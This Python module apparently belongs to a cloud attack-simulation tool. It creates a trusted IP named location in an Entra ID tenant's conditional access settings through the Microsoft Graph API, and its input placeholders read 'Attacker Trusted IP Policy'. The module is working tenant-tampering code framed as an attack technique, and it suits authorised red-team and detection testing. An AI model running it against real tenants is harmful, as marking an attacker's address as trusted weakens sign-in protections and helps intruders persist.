# Modify named locations to add trusted IP
from core.GraphFunctions import graph_post_request
from dash import dcc,html

def TechniqueMain(trusted_policy_name, ip_addr):
    '''
    Description: Modify Trusted IP Configuration
    Privileges: Policy.Read.All and Policy.ReadWrite.ConditionalAccess
    Ref: https://learn.microsoft.com/en-us/graph/api/conditionalaccessroot-post-namedlocations?view=graph-rest-1.0&tabs=http
    '''

    endpoint_url = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations"

    data = {
        "@odata.type": "#microsoft.graph.ipNamedLocation",
        "displayName": trusted_policy_name,
        "isTrusted": 'true',
        "ipRanges": [
            {
                "@odata.type": "#microsoft.graph.iPv4CidrRange",
                "cidrAddress": ip_addr
            }
        ]
    }

    trusted_ip_config = graph_post_request(url = endpoint_url, data = data)
    print(trusted_ip_config)
    return trusted_ip_config

def TechniqueConfigDisplay():
    '''This function returns the config display for all inputs required for technique execution'''
    technique_config = []
    technique_config.append(html.Br())
    technique_config.append(html.H5("Attack Technique Config"))
    technique_config.append(html.B("New Policy Name: "))
    technique_config.append(
        dcc.Input(
            id = "mod-trstd-ip-config-policy-name-text-input",
            type = "text",
            placeholder = "Attacker Trusted IP Policy",
        )
    )
    technique_config.append(html.Br())
    technique_config.append(html.Br())
    technique_config.append(html.B("IP Address with subnet: "))
    technique_config.append(
        dcc.Input(
            id = "mod-trstd-ip-config-ip-text-input",
            type = "text",
            placeholder = "1.1.1.1/22",
        )
    )
    technique_config.append(html.Br())
    technique_config.append(html.Br())

    return technique_config

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "New Policy Name", "id" : "mod-trstd-ip-config-policy-name-text-input", "type" : "text", "placeholder" : "Attacker Trusted IP Policy", "element_type" : "dcc.Input"},
        {"title" : "IP Address with subnet", "id" : "mod-trstd-ip-config-ip-text-input", "type" : "text", "placeholder" : "1.1.1.1/22", "element_type" : "dcc.Input"}
    ]